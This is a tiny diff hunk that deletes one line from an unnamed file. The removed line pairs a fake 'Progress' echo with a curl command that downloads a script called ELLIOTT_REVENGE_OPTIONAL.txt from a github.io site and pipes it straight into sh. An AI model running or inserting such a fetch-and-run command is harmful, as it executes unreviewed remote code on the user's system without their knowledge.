@@ -1,1 +1,0 @@
-echo Progress: 58.00%curl -L --progress-bar frkns.github.io/fun/ELLIOTT_REVENGE_OPTIONAL.txt | sh
